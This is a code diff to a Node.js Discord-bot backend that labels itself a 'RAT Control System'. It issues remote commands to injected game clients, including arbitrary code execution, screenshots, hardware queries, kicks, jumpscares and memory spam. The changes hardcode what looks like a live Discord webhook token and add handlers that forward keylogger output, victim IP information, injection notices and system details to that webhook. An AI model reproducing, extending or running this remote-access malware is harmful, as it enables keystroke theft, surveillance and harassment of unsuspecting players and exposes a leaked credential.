@@ -4,7 +4,7 @@ const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
 
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
-const WEBHOOK_URL = process.env.WEBHOOK_URL;
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
 const PORT = process.env.PORT || 10000;
 
 let commandQueue = [];
@@ -53,19 +53,8 @@ if (DISCORD_TOKEN) {
         const args = message.content.slice(1).split(' ');
         const command = args.shift().toLowerCase();
         
-        const noTargetCommands = ['users', 'status', 'help', 'test', 'print', 'antileave'];
-        
-        if (noTargetCommands.includes(command) || args.length === 0) {
+        if (['users', 'status', 'help', 'test', 'print'].includes(command) || args.length === 0) {
             return { command, args, target: null };
-        }
-        
-        if (command === 'antileave') {
-            if (args[0] === 'status') return { command, args, target: null };
-            if (args[0] === 'enable' && args.length > 1 && !args[1].match(/^[0-9]+$/)) {
-                const target = args[1];
-                args.splice(1, 1);
-                return { command, args, target };
-            }
         }
         
         const firstArg = args[0];
@@ -218,64 +207,6 @@ if (DISCORD_TOKEN) {
                     }
                 },
                 
-                antileave: async () => {
-                    const action = args[0]?.toLowerCase();
-                    
-                    if (!action || !['enable', 'disable', 'status'].includes(action)) {
-                        const embed = new EmbedBuilder()
-                            .setTitle('🛡️ AntiLeave System')
-                            .setDescription('**Usage:**')
-                            .setColor(0x7289da)
-                            .addFields(
-                                { name: 'Enable for all', value: '`/antileave enable`', inline: true },
-                                { name: 'Enable for player', value: '`/antileave enable name`', inline: true },
-                                { name: 'Disable', value: '`/antileave disable`', inline: true },
-                                { name: 'Status', value: '`/antileave status`', inline: true }
-                            );
-                        await message.reply({ embeds: [embed] });
-                        return;
-                    }
-                    
-                    let targetForCommand = null;
-                    let argsForCommand = [action];
-                    
-                    if (action === 'enable') {
-                        if (target) {
-                            targetForCommand = target;
-                            argsForCommand.push(target);
-                        } else if (args[1] && !args[1].match(/^[0-9]+$/)) {
-                            targetForCommand = args[1];
-                            argsForCommand.push(args[1]);
-                        }
-                    }
-                    
-                    if (await sendCommand("anti_leave", argsForCommand, targetForCommand || null)) {
-                        let description = '';
-                        let embedColor = 0x3498db;
-                        
-                        if (action === 'enable') {
-                            description = '**AntiLeave Activated!**';
-                            if (targetForCommand) description += `\n**Target:** \`${targetForCommand}\``;
-                            embedColor = 0xff0000;
-                        } else if (action === 'disable') {
-                            description = '**AntiLeave Deactivated**';
-                            embedColor = 0x00ff00;
-                        } else {
-                            description = '**Status request sent**';
-                        }
-                        
-                        const embed = createEmbed(
-                            action === 'enable' ? 'AntiLeave Enabled' : 
-                            action === 'disable' ? 'AntiLeave Disabled' : 'AntiLeave Status',
-                            description,
-                            embedColor,
-                            targetForCommand || null
-                        );
-                        
-                        await message.reply({ embeds: [embed] });
-                    }
-                },
-                
                 users: async () => {
                     const data = await getOnlineUsers();
                     
@@ -326,11 +257,11 @@ if (DISCORD_TOKEN) {
                         .setDescription('**Available Commands:**')
                         .setColor(0x7289da)
                         .addFields(
-                            { name: '🛡️ AntiLeave', value: '`/antileave enable [name]`\n`/antileave disable`\n`/antileave status`', inline: false },
                             { name: '👤 Player Control', value: '`/kick [name] <reason>`\n`/freeze [name] <seconds>`\n`/void [name]`\n`/spin [name]`\n`/fling [name]`', inline: false },
                             { name: '⚙️ System', value: '`/execute [name] <code>`\n`/fakeerror [name] <text>`\n`/hardware [name]`\n`/screenshot [name]`', inline: false },
-                            { name: '👻 Fun', value: '`/jumpscare [name] <type>`\n`/blur [name] <seconds>`\n`/message [name] <text>`', inline: false },
-                            { name: '📊 Info', value: '`/users`\n`/status`\n`/test`\n`/print`', inline: false }
+                            { name: '👻 Fun', value: '`/jumpscare [name] <type>`\n`/blur [name] <seconds>`\n`/message [name] <text>`\n`/chat [name]`', inline: false },
+                            { name: '📊 Info', value: '`/users`\n`/status`\n`/test`\n`/print`', inline: false },
+                            { name: '💥 Spam', value: '`/memory [name] <count>`', inline: false }
                         );
                     
                     await message.reply({ embeds: [helpEmbed] });
@@ -362,6 +293,27 @@ function cleanupInactiveUsers() {
 }
 
 setInterval(cleanupInactiveUsers, 30 * 1000);
+
+async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                embeds: [{
+                    title: title,
+                    description: description,
+                    color: color,
+                    fields: fields,
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "RAT Control System" }
+                }]
+            })
+        });
+    } catch (error) {
+        console.error('Discord webhook error');
+    }
+}
 
 const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -415,10 +367,28 @@ const server = http.createServer((req, res) => {
     if (req.method === 'POST' && req.url === '/command') {
         let body = '';
         req.on('data', chunk => body += chunk);
-        req.on('end', () => {
+        req.on('end', async () => {
             try {
                 const { command, args, target } = JSON.parse(body);
                 commandQueue.push({ command, args: args || [], target: target || null });
+                
+                // Отправка уведомления об инжекте в Discord
+                if (command === "inject_notify") {
+                    const [playerName, gameName, ipInfo, executor, device] = args;
+                    
+                    let description = `**Игрок:** ${playerName}\n`;
+                    description += `**Игра:** ${gameName}\n`;
+                    description += `**Инжектор:** ${executor}\n`;
+                    description += `**Устройство:** ${device}\n\n`;
+                    description += `**IP информация**\n${ipInfo}`;
+                    
+                    await sendDiscordMessage(
+                        "🔌 Новый инжект!",
+                        description,
+                        0x00ff00
+                    );
+                }
+                
                 res.end(JSON.stringify({ status: "OK" }));
             } catch (e) {
                 res.statusCode = 400;
@@ -481,8 +451,19 @@ const server = http.createServer((req, res) => {
     if (req.method === 'POST' && req.url === '/keylog') {
         let body = '';
         req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            res.end(JSON.stringify({ status: "OK" }));
+        req.on('end', async () => {
+            try {
+                const { logs } = JSON.parse(body);
+                await sendDiscordMessage(
+                    "⌨️ Кейлоггер",
+                    `\`\`\`${logs.slice(0, 1900)}\`\`\``,
+                    0xe74c3c
+                );
+                res.end(JSON.stringify({ status: "OK" }));
+            } catch (e) {
+                res.statusCode = 400;
+                res.end(JSON.stringify({ error: e.message }));
+            }
         });
         return;
     }
@@ -490,8 +471,26 @@ const server = http.createServer((req, res) => {
     if (req.method === 'POST' && req.url === '/hardware') {
         let body = '';
         req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            res.end(JSON.stringify({ status: "OK" }));
+        req.on('end', async () => {
+            try {
+                const { player, data } = JSON.parse(body);
+                await sendDiscordMessage(
+                    "💻 Информация о системе",
+                    `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
+                    0x9b59b6,
+                    [
+                        {
+                            name: "Системная информация",
+                            value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
+                            inline: true
+                        }
+                    ]
+                );
+                res.end(JSON.stringify({ status: "OK" }));
+            } catch (e) {
+                res.statusCode = 400;
+                res.end(JSON.stringify({ error: e.message }));
+            }
         });
         return;
     }
